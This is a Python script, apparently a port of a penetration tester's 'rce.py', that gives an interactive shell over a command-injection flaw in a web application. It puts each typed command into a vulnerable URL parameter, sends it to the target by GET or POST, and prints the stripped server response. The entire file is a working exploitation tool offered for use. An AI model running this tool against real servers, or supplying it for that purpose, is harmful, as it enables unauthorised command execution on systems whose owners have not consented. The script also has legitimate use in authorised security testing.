#!/usr/bin/env python3
"""
rce.py – Remote Code Execution Shell (portiert auf Python 3)
Tim Tomes (@LaNMaSteR53)
"""

import sys
import re
from urllib.parse import urlsplit, urlencode
from urllib.request import urlopen

def usage():
    print("""\
rce.py - Tim Tomes (@LaNMaSteR53) (www.lanmaster53.com)

Usage:
  ./rce.py [options] url_with_<rce>
Options:
  -p    Use POST (default is GET)
  -h    Show help
<rce> is the vulnerable parameter placeholder.

Example:
  ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
  ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
""")
    sys.exit()

base_url = ''
for arg in sys.argv[1:]:
    if '://' in arg:
        base_url = arg
        break
if not base_url or '-h' in sys.argv:
    usage()

use_post = ('-p' in sys.argv)

print("Type 'exit' to quit.")
while True:
    try:
        cmd = input("cmd> ")
    except EOFError:
        break
    if cmd.strip().lower() == 'exit':
        sys.exit(0)

    url = base_url.replace('<rce>', cmd)
    try:
        if use_post:
            parts = urlsplit(url)
            query = parts.query
            site = url[:url.find(query)-1]
            data = urlencode(dict([p.split('=', 1) for p in query.split('&')])).encode()
            resp = urlopen(site, data=data)
        else:
            resp = urlopen(url)
        content = resp.read().decode(errors='ignore')
        # Entfernt einfache HTML-Tags
        clean = re.sub(r"<\/?\w+?>", "", content)
        print(f"[*] Executed: {cmd}\n{clean}")
    except Exception as e:
        print(f"[!] Fehler: {e}")
